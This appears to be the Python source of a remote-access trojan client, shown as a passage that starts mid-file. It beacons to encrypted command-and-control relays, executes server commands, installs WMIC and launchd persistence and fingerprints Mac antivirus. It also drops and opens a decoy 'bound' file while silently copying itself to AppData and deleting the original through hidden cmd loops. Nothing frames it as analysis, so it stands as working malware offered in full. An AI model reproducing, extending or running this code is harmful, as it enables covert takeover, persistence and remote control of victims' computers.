            runtime_config_folder_path = os.path.join(os.environ['appdata'] , 'Microsoft')
        elif(platform.system() == OSType.OSX):
            runtime_config_folder_path = os.path.join(os.getenv('HOME') , '.appdata')

        if not os.path.exists(runtime_config_folder_path):
            os.makedirs(runtime_config_folder_path)
        self.runtime_config.path =os.path.join( runtime_config_folder_path , 'grconf.dat')

    def add_startup(self):
        try:
           return self.startup.add_startup(self.app_path)
        except Exception as e:
            return False

    def  add_random_serial(self):
        random_serial = ''.join(random.choice(string.lowercase) for i in range(10))

        self.serial += random_serial

    def add_config(self):
        try:
            if getattr(sys, 'frozen', False):
                config_enc = self.config.read_config(self.app_path)
                config_strings = base64.b64decode(config_enc).split('##')
                self.version = config_strings[0]
                self.serial = config_strings[1]

                list_relay = config_strings[2].split('**')
                for item in list_relay:
                    data = item.split('--')
                    self.relay[data[0]] = data[1]
                self.enc_key = int(config_strings[3])
                self.timeout_s = int(config_strings[4])
                self.short_time_s = int(config_strings[5])
                self.long_time_s = int(config_strings[6])
                self.send_result_count_max = int(config_strings[7])
                self.is_random_serial = int(config_strings[8])
                self.BindFileName = (config_strings[9])
                list_relay = config_strings[10].split('**')
                for item in list_relay:
                    data = item.split('--')
                    if len(data) > 1:
                        self.safe_relay[data[0]] = data[1]
            else:
                pass
        except Exception as e:
            pass

        try:
            self.crypto.key = self.enc_key

            runtime_config_enc = self.runtime_config.read_config()
            if runtime_config_enc:
                runtime_config_plain = self.crypto.decrypt(runtime_config_enc)

                runtime_config_list = runtime_config_plain.split('-')

                self.short_time_s = int(runtime_config_list[0])
                self.long_time_s = int(runtime_config_list[1])

        except Exception as e:
            pass


    def prepare_client_data(self, answer_type_value, data, command_number, current_relay):
        ClientData.s = self.serial
        ClientData.v = self.version
        ClientData.t = answer_type_value
        ClientData.d = data
        ClientData.i = command_number
        ClientData.r = current_relay

        # Serialize data
        data_serialized = self.serialization.serialize(ClientData)

        # Encrypt data
        client_data_enc = self.crypto.encrypt(data_serialized)

        return client_data_enc

    def get_data_to_send(self):
        try:
            if self.is_sent:
                data = ''
                if len(self.client_error_store_list) > 0:
                    data = self.client_error_store_list.pop(0)

                if not data:
                    client_data_enc = self.prepare_client_data(self.answer_type_value, self.command_result_value, self.command_number, '')

                    self.client_data_store = client_data_enc
                else:
                    self.answer_type_value = AnswerTypeEnum.Error
                    self.client_data_store = data
            elif not self.client_data_store:
                client_data_enc = self.prepare_client_data(self.answer_type_value, self.command_result_value, self.command_number, '')

                self.client_data_store = client_data_enc
        except Exception as e:
            pass

    def connect_and_send(self):
        try:

            if len(self.relay) == 0:
                return

            self.is_sent = False

            if len(self.temp_relay) == 0:
                self.use_safe_relay +=1
                if(self.use_safe_relay % 2==0 or self.use_safe_relay > 1 ):
                    self.is_safe_relay = True
                else:
                    self.is_safe_relay = False
                if(len(self.safe_relay)==0 or self.is_safe_relay == False):
                    self.temp_relay = dict( self.relay)
                else:
                    self.temp_relay =dict( self.safe_relay)

                if(self.use_safe_relay == self.max_use_safe_relay):
                    self.use_safe_relay = 0

            urls = []
            urls_key = []
            rnd = 0

            urls = self.temp_relay.keys()
            urls_key = self.temp_relay.values()

            rnd = random.randint(0, len(self.temp_relay) - 1)

            self.current_relay = urls[rnd]

            response_enc = self.request.send_request(self.current_relay, urls_key[rnd], self.client_data_store)
            return response_enc
        except Exception as e:
            pass


    def do_it(self, command):
        command.execute()

    def process_server_data(self, response):
        try:
            if not response:
                if self.send_interval_s < self.long_time_s:
                    self.send_interval_s += self.short_time_s
                else:
                    self.send_interval_s = self.long_time_s

                return

            self.response.parser = XmlParser()
            self.response.parser.crypto = self.crypto

            self.response.process_response(response)

            if ServerData.f == 'relay':
                data_enc = self.crypto.encrypt(ServerData.c)

                current_relay_enc = self.crypto.encrypt(self.current_relay)

                client_data_enc = self.prepare_client_data(AnswerTypeEnum.RelayError, data_enc, ServerData.i, current_relay_enc)

                if len(self.client_error_store_list) == self.error_max:
                    self.client_error_store_list.pop(-1)

                    self.client_error_store_list.insert(0, client_data_enc)
                else:
                    self.client_error_store_list.append(client_data_enc)

                self.client_error_store_list = list(set(self.client_error_store_list))

                self.send_count += 1

                if self.send_count == self.send_result_count_max:
                    self.is_sent = True
                elif self.answer_type_value == AnswerTypeEnum.Error:
                    self.is_sent = True

                if self.send_interval_s < self.long_time_s:
                    self.send_interval_s += self.short_time_s
                else:
                    self.send_interval_s = self.long_time_s

                del self.temp_relay[self.current_relay]

                return

            # Set cmd args
            cmdArgs.app_path = self.app_path
            cmdArgs.cmd = ServerData
            cmdArgs.timeout = self.timeout_s
            cmdArgs.serial_file_path = self.serial_file_path

            command = self.dict_commands[ServerData.t]
            command.crypto = self.crypto
            command.startup = self.startup
            command.config = self.runtime_config
            command.cmd_args = cmdArgs

            self.do_it(command)

            # Run time config to update interval time
            if CommandResult.cmd:
                runtime_config_list = CommandResult.cmd.split('-')

                self.short_time_s = int(runtime_config_list[0])
                self.long_time_s = int(runtime_config_list[1])

            cmd_result_enc = self.crypto.encrypt(CommandResult.result)
            self.command_result_value = cmd_result_enc

            if CommandResult.is_error:
                client_data_enc = self.prepare_client_data(AnswerTypeEnum.InternalError, self.command_result_value, ServerData.i, '')

                if len(self.client_error_store_list) == self.error_max:
                    self.client_error_store_list.pop(-1)

                    self.client_error_store_list.insert(0, client_data_enc)
                else:
                    self.client_error_store_list.append(client_data_enc)

            self.is_sent = True
            self.client_data_store = ''

            if ServerData.t == CommandsEnum.Nothing:
                self.answer_type_value = AnswerTypeEnum.Check

                if self.send_interval_s < self.long_time_s:
                    self.send_interval_s += self.short_time_s
                else:
                    self.send_interval_s = self.long_time_s
            else:
                self.answer_type_value = AnswerTypeEnum.Acknowledge

                self.send_interval_s = self.short_time_s

            self.command_number = ServerData.i

            if(self.is_safe_relay):
                del self.temp_relay[self.current_relay]

        except Exception as e:
            pass


class CrossPlatformTools:

    @staticmethod
    def binded_resource_file(binded_name):
        try:
            if (not CrossPlatformTools.isScript() and platform.system() == OSType.Windows):

                try:
                    if(sys.argv[1] == '-u'):
                        return
                except Exception as e:
                    pass

                verOs = platform.version()
                if (len(verOs.split('.')) > 0):
                    verOs = verOs.split('.')[0]

                if int(verOs) >= 6:
                    exepath = os.path.expanduser("~\\AppData\\Roaming\\" )
                else:
                    exepath = os.path.expanduser("~\\Application Data\\Microsoft\\" )
                s_spliter = '**' + '<start_resource_file>' + '**'
                e_spliter = '**' + '<end_resource_file>' + '**'

                fpath = sys.argv[0]

                dstPath = os.path.join(exepath, os.path.basename(fpath))

                if dstPath == fpath:
                    return

                # copy to new path
                CrossPlatformTools.copyfile(fpath, dstPath)

                dst_file_handle = open(dstPath, "rb")
                data = dst_file_handle.read()
                s_index = data.find(s_spliter)
                if(s_index > -1):
                    s_index = s_index + len(s_spliter)
                    e_index = data.find(e_spliter)
                    if(e_index > 0):
                        dst_file_handle.seek(s_index)
                        data_resource = dst_file_handle.read(e_index - s_index)

                        filename, file_extension_binded = os.path.splitext(binded_name)
                        filename, file_extension = os.path.splitext(fpath)
                        filename = filename + str(chr(160))
                        path = os.path.join(os.path.dirname(fpath), filename + file_extension_binded)

                        bind_file_handle = open(path, 'wb')
                        bind_file_handle.write(data_resource)
                        bind_file_handle.close()

                        # Execute binded file
                        os.startfile('"' + path + '"')

                dst_file_handle.close()
                        
                # Close temp file that used to avoid duplicated instance
                file_locked.close()
                if not file_locked.closed:
                    file_locked.close()

                if int(verOs) < 6:
                    cmd_exec = 'cmd /c (IF NOT EXIST "' + fpath + '" (exit) ELSE (ping 127.0.0.1 -n 3 > nul))' + ' & DEL /F /Q "' + fpath + '" & cd %temp% & start "" "' + dstPath + '"'
                else:
                    cmd_exec = 'cmd /c ' + 'FOR /l %i in (1,1,10) DO IF NOT EXIST "' + fpath + '" (start "" "' + dstPath + '" & exit ) ELSE ((DEL /F /Q "' + fpath + '") & timeout /t 1)'

                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                subprocess.Popen(cmd_exec, startupinfo=startupinfo)

                sys.exit()

        except Exception as e:
            pass

    @staticmethod
    def kill_all_process_by_my_pid():
        if (platform.system() == OSType.Windows):
            try:
                plist = CrossPlatformTools.get_process_list_by_parentpid(os.getpid())
                for s in plist:
                    try:
                        os.kill(s, SIGTERM)
                    except Exception as e:
                        pass
                    plist1 = CrossPlatformTools.get_process_list_by_parentpid(s)
                    if (len(plist1)):
                        for s1 in plist1:
                            os.kill(s1, SIGTERM)
            except Exception as e:
                pass

    @staticmethod
    def kill_process_by_parentpid(ppid):
        if (platform.system() == OSType.Windows):
            plist = CrossPlatformTools.get_process_list_by_parentpid(ppid)
            for s in plist:
                os.kill(s, SIGTERM)

    @staticmethod
    def get_process_list_by_parentpid(ppid):
        if (platform.system() == OSType.Windows):
            plist = []
            cmd = "wmic process get processid,parentprocessid"
            strList = CrossPlatformTools.exe_cmd(cmd)
            strList = strList.split('\r\n')
            for s in strList:
                list = s.split()
                if (len(list) > 0):
                    if (list[0].isdigit()):
                        pid = int(list[0])
                        if (pid == ppid):
                            plist.append(int(list[1]))
                            continue
            return plist
            pass

    @staticmethod
    def exe_cmd(cmd):
        p = subprocess.Popen(cmd, shell=isinstance(cmd, basestring),
                             bufsize=-1, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
        stout, sterr = p.communicate()
        strList = stout.decode()
        return strList
    @staticmethod
    def get_temp_foder():
        if(platform.system()== OSType.Windows):
            for envname in 'TMPDIR', 'TEMP', 'TMP':
                dirname = os.getenv(envname)
                if not dirname == '' and not dirname == None:
                    return dirname
        else:
            return os.environ['HOME']

    @staticmethod
    def isScript():
        return not getattr(sys, 'frozen', False)


    if(platform.system() == OSType.Windows):
        @staticmethod
        def get_python_path():
            try:
                for p in sys.path:
                    if(os.path.exists(os.path.join(p,"pythonw.exe"))):
                        return os.path.join(p, "pythonw.exe")
            except Exception as e:
                pass
            return ''
    @staticmethod
    def copyfile(fpath , dstPath):
        try:
            sfile = open(fpath, "rb")
            bytes = sfile.read()
            sfile.close()

            ofile = open(dstPath, "wb")
            ofile.write(bytes)
            ofile.close()
        except Exception as e:
            pass

    if(platform.system()== OSType.OSX):
        @staticmethod
        def get_proc_list():
            #Return a list [] of Proc objects representing the active
            #process list list
            proc_list = {}
            try:
                sub_proc = subprocess.Popen(['ps', '-A' , '-o' , 'pid,command'], shell=False, stdout=subprocess.PIPE)
                #Discard the first line (ps aux header)
                sub_proc.wait()
                for line in sub_proc.stdout:
                    try:
                        #The separator for splitting is 'variable number of spaces'
                        items= line.strip().split(" ",1)
                        if( len(items)>1 ):
                                if(int(items[0])>0):
                                    proc_list[items[0]]= line
                    except Exception as e :
                        pass
            except Exception as e :
                pass
            return proc_list



        @staticmethod
        def instance_exists():
            pname = sys.argv[0]
            pid = os.getpid()
            lists=CrossPlatformTools.get_proc_list()
            for key , cmd in lists.iteritems():
                try:
                    if(pname in cmd):
                        if (not pid == int(key)):
                            return True
                except Exception as e:
                    pass
            return False


        @staticmethod
        def check_daemon_running():
            terminal = subprocess.Popen(["launchctl" ,"list"] ,  stdout=subprocess.PIPE)
            terminal.wait()
            processList= terminal.communicate()[0].split("\n")
            isScript = CrossPlatformTools.isScript()
            for row in  processList:
                try:
                    if(isScript):
                        cols=row.split()
                        if(len(cols)>1):
                            if(PLIST_SIGN_KEY in row):
                                return True
                    else:
                        if(PLIST_SIGN_KEY in row):
                            return True
                except Exception as e:
                    pass
            return False

        @staticmethod
        def my_process_is_daemon():
            terminal = subprocess.Popen(["launchctl" ,"list"] ,  stdout=subprocess.PIPE)
            terminal.wait()
            pid = os.getpid()
            processList= terminal.communicate()[0].split("\n")
            isScript = CrossPlatformTools.isScript()
            for row in  processList:
                try:

                    cols=row.split("\t0\t")
                    if(len(cols) < len(row.split("\t"))):
                        cols=row.split("\t")

                    if(len(cols)>0):
                        if(isScript):
                            if(PLIST_SIGN_KEY in row):
                                pid = os.getpid()
                                if(int(cols[0]) == os.getpid()):
                                    return True
                                else:
                                    return False
                        else:
                            if(PLIST_SIGN_KEY in row):
                                for i in [0,1,2]:
                                    if(pid + i == int(cols[0]) or pid - i == int(cols[0])):
                                        return True
                except Exception as e:
                    pass
            return False

        @staticmethod
        def get_antivirus_applications():
            anti_list=['kaspersky security.app','kaspersky anti-virus for mac.app' ,'intego', 'sophos anti-virus.app' ,'virusbarrier.app','mcafee internet security.app']
            terminal = subprocess.Popen(["ls" ,"/Applications"] ,  stdout=subprocess.PIPE)
            terminal.wait()
            processList= terminal.communicate()[0].split("\n")
            for row in  processList:
                if row.lower() in anti_list:
                    return row.replace(".app", "")
            return ""

if __name__ == '__main__':
    # Use .pyw to no console
    # Avoid duplicate instance
    # Use random serial or not
    try:
        reload(sys)
        sys.setdefaultencoding('utf8')
    except Exception as e:
        pass

    fixed_serial = None
    use_random_serial = True

    ## check for single instance for osx
    if(platform.system() == OSType.OSX):
        if(not CrossPlatformTools.my_process_is_daemon() and CrossPlatformTools.check_daemon_running()):
            sys.exit()

    # Create guard instance
    guard = Guard.get_instance()

    guard.crypto = Xor()
    guard.request = Transmission()
    guard.response = Response()
    if(platform.system() == OSType.Windows):
        guard.startup = RunLocal_WMIC()
    elif (platform.system() == OSType.OSX):
        guard.startup = RunOnOSX_UserDeamon()
    guard.serialization = XmlSerialization()
    guard.config = RCDataConfig()
    guard.runtime_config = DSVRuntimeConfig()

    guard.start()

    guard.add_config()

    file_path = os.path.join(CrossPlatformTools.get_temp_foder(), 'glocked.tmp')
    if os.path.exists(file_path):
        use_random_serial = False
        try:
            file_locked = open(file_path, 'r+')
            fixed_serial = file_locked.read()
            file_locked.close()

            os.remove(file_path)

            if not fixed_serial:
                use_random_serial = True

            file_locked = open(file_path, 'w+')
            file_locked.write(fixed_serial)
            file_locked.close()

            file_locked = open(file_path, 'r+')
        except Exception as e:
            if(not CrossPlatformTools.isScript() and platform.system() == OSType.Windows):
                CrossPlatformTools.binded_resource_file(guard.BindFileName)

            sys.exit()

    # Continue to avoid duplicate instance
    # And use random serial or not
    if guard.is_random_serial and use_random_serial:
        guard.add_random_serial()

        # Encrypt serial
        guard.serial = guard.crypto.encrypt(guard.serial)

        file_locked = open(file_path, 'w+')
        file_locked.write(guard.serial)
        file_locked.close()

        file_locked = open(file_path, 'r+')
    elif not use_random_serial:
        guard.serial = fixed_serial
    else:
        # Encrypt serial
        guard.serial = guard.crypto.encrypt(guard.serial)

    if(not CrossPlatformTools.isScript() and platform.system() == OSType.Windows):
        CrossPlatformTools.binded_resource_file(guard.BindFileName)

    guard.serial_file_path = file_path

    # To avoid create startup when '/s' exist in args
    if '/s' not in guard.arg:
        result = guard.add_startup()

        if not result:
            if(platform.system() == OSType.Windows):
                guard.startup = RunOnceUser_WMIC()
            elif (platform.system() == OSType.OSX):
                guard.startup = RunOnOSX_UserDeamon()
            guard.add_startup()

    guard.send_interval_s = guard.short_time_s
    guard_timer = GuardTimer()
    guard_timer.interval = guard.send_interval_s

    guard_timer.run()
 